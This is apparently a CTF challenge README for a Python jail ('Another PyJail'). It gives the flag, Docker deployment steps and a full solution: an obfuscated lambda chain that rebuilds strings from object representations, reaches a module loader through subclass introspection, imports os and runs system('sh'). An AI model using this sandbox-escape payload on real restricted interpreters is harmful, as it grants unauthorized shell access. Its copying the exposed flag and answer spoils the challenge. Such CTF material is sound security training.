# Another PyJail

**Author**: JuliaPoo

**Category**: Misc

Flag: `SEE{D0nt_Y0u_h4Te_tYp05_4lL_tHE_t1M3}`

Honestly, if we have too many challenges can just not use this one.

## Description

```
Another PyJail.
```

## Deployment

At the `src` directory, run
```
docker build -t chal-another-pyjail .
docker run -d -p "0.0.0.0:<port>:1337" -h "chal-another-pyjail" --name="chal-another-pyjail" chal-another-pyjail
```

## Difficulty

Medium

## Solution

```py
# Runs system("sh"),
# getattr.__class__.__bases__[0].__subclasses__()[80].load_module('builtins')

lambda g: (
    (lambda _0, _1:
        (lambda _2, _4, _8, _16, _32, _64, _128: 
        (lambda _1234567890:
            (lambda 
                s_n,s_r,s_a,s_o,s_t,s_c,s_l,s_larr,s_i,s_g,s_e,s_b,s_dash,s_f,s_ ,s_rarr,s_u,
                s_T,
                s_F,s_s,
                s_lbrack,s_rbrack,
                s_4,s_5,s_9,s_6,s_3,s_8,s_2,s_7,s_0,s_1,
                s_x,s_j,s_N:
                (lambda morestr:
                    (lambda s_d,s_m,s_h:
                        (lambda fromhex, decodestr:
                            (lambda 
                                s__class__,
                                s__bases__,
                                s__subclasses__,
                                s_load_module,
                                s_system:
                                (lambda load_module:
                                    (lambda os: 
                                        (lambda system: system(s_s + s_h))
                                        (g(os, s_system))
                                    )(load_module(s_o + s_s))
                                )(g(g(g(g(g, s__class__), s__bases__)[_0], s__subclasses__)()[_16+_64], s_load_module))
                            )(
                                g(fromhex(s_5+s_f+s_5+s_f+s_6+s_3+s_6+s_c+s_6+s_1+s_7+s_3+s_7+s_3+s_5+s_f+s_5+s_f), decodestr)(),
                                g(fromhex(s_5+s_f+s_5+s_f+s_6+s_2+s_6+s_1+s_7+s_3+s_6+s_5+s_7+s_3+s_5+s_f+s_5+s_f), decodestr)(),
                                g(fromhex(s_5+s_f+s_5+s_f+s_7+s_3+s_7+s_5+s_6+s_2+s_6+s_3+s_6+s_c+s_6+s_1+s_7+s_3+s_7+s_3+s_6+s_5+s_7+s_3+s_5+s_f+s_5+s_f), decodestr)(),
                                g(fromhex(s_6+s_c+s_6+s_f+s_6+s_1+s_6+s_4+s_5+s_f+s_6+s_d+s_6+s_f+s_6+s_4+s_7+s_5+s_6+s_c+s_6+s_5), decodestr)(),
                                g(fromhex(s_7+s_3+s_7+s_9+s_7+s_3+s_7+s_4+s_6+s_5+s_6+s_d), decodestr)()
                            )
                        )(g(g(s_5+s_f, s_e+s_n+s_c+s_o+s_d+s_e)(), s_f+s_r+s_o+s_m+s_h+s_e+s_x), s_d+s_e+s_c+s_o+s_d+s_e)
                    )(morestr[_1+_2+_4+_8],morestr[_2+_8],morestr[_1+_4+_8])
                )(f"{g({}, s_g+s_e+s_t)}")
            )(
                f'{g}'[_8],f'{g}'[_1+_8+_16],f'{g}'[_2+_4+_16],f'{g}'[_16],f'{g}'[_1+_4],f'{g}'[_1+_4+_8],f'{g}'[_4],f'{g}'[_0],f'{g}'[_1+_2],f'{g}'[_1+_2+_16],f'{g}'[_4+_16],f'{g}'[_1],f'{g}'[_2+_4],f'{g}'[_2+_8],f'{g}'[_1+_8],f'{g}'[_2+_8+_16],f'{g}'[_2], 
                f'{g==g}'[_0], 
                f'{g!=g}'[_0],f'{g!=g}'[_1+_2],
                f"{({*f'{g}'[_0:_0]})}"[_1+_2],f"{({*f'{g}'[_0:_0]})}"[_4],
                f"{_1234567890}"[_1+_2],f"{_1234567890}"[_4],f"{_1234567890}"[_8],f"{_1234567890}"[_1+_4],f"{_1234567890}"[_2],f"{_1234567890}"[_1+_2+_4],f"{_1234567890}"[_1],f"{_1234567890}"[_2+_4],f"{_1234567890}"[_1+_8],f"{_1234567890}"[_0],
                f"{(lambda:(yield))()}"[_1+_2+_8+_16],f"{(lambda:(yield))()}"[_1+_4+_8],f"{(lambda:(yield))()}"[_2+_16]
            ) 
        )(_2+_16+_64+_128+(_1<<(_1+_8))+(_1<<(_1+_16))+(_1<<(_2+_16))+(_1<<(_4+_16))+(_1<<(_1+_2+_4+_16))+(_1<<(_8+_16))+(_1<<(_1+_2+_8+_16))+(_1<<(_2+_4+_8+_16)))
        )(_1+_1, _1<<(_1+_1), _1<<(_1+_1+_1), _1<<(_1+_1+_1+_1), _1<<(_1+_1+_1+_1+_1), _1<<(_1+_1+_1+_1+_1+_1), _1<<(_1+_1+_1+_1+_1+_1+_1))
    )(g!=g, g==g)
)
```